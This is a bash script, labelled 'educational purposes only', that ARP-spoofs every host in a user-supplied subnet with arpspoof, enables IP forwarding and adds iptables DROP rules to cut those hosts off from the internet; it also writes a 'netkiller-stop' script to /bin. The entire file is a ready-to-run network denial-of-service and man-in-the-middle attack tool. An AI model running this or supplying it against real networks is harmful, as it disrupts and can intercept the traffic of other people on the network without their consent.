#!/bin/bash

# ARP Spoofing Internet Blocker (Educational Purposes Only)
# Targets all possible IPs in subnet (without scanning)                                                                             # Requires: arpspoof, iptables, ipcalc

echo "Enter the Network Interface (e.g., wlan0):"
read -p "> " INTERFACE

echo "Enter the Router Gateway IP:"
read -p "> " GATEWAY

# Detect Device IP
echo "Enter Device IP: Enter by default"
IP=$(ip addr show "$INTERFACE" | awk '/inet / {print $2}' | cut -d/ -f1)
read -p "> $IP" DEVIP
MYIP="${DEVIP:-$IP}"

echo "Enter the target subnet (e.g., 192.168.1.1/24):"
read -p "> " TARGET_SUBNET

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Flush existing rules
iptables -t nat -F
iptables -F FORWARD

# Create stop script
cat > /bin/netkiller-stop << EOF
#!/bin/sh

iptables -t nat -F
iptables -F FORWARD
pkill arpspoof
echo "Restoring the connection..."
EOF
chmod 755 /bin/netkiller-stop

# Function to expand a subnet to individual IPs (using ipcalc)
expand_subnet() {
    SUBNET=$1
    IFS='/' read -r IP MASK <<< "$SUBNET"
    ipcalc -n -b "$SUBNET" | awk '/HostMin/ {start=$2} /HostMax/ {end=$2} END {if(start && end) print start, end}'
}

# Expand subnet for ARP spoofing
read HOSTMIN HOSTMAX < <(expand_subnet "$TARGET_SUBNET")
if [[ -n "$HOSTMIN" && -n "$HOSTMAX" ]]; then
    # Convert IPs to integers
    ip2int() {
        local a b c d
        IFS=. read -r a b c d <<< "$1"
        echo "$((a*256**3 + b*256**2 + c*256 + d))"
    }
    int2ip() {
        local ip=$1
        echo "$((ip>>24&255)).$((ip>>16&255)).$((ip>>8&255)).$((ip&255))"
    }
    START=$(ip2int $HOSTMIN)
    END=$(ip2int $HOSTMAX)
    for ((i=START; i<=END; i++)); do
        TARGET_IP=$(int2ip $i)
        (
            # Block all the traffic except the DEVICE IP and GATEWAY
            iptables -I FORWARD ! -s "$MYIP" -d "$GATEWAY" -j DROP
            iptables -I FORWARD ! -d "$GATEWAY" -s "$MYIP" -j DROP
          
            arpspoof -i "$INTERFACE" -t "$TARGET_IP" "$GATEWAY" >/dev/null 2>&1 &
            arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET_IP" >/dev/null 2>&1 &
        ) &
    done
fi

echo "Attack is running against all possible hosts in $TARGET_SUBNET"
echo "To stop, Type: sudo netkiller-stop"
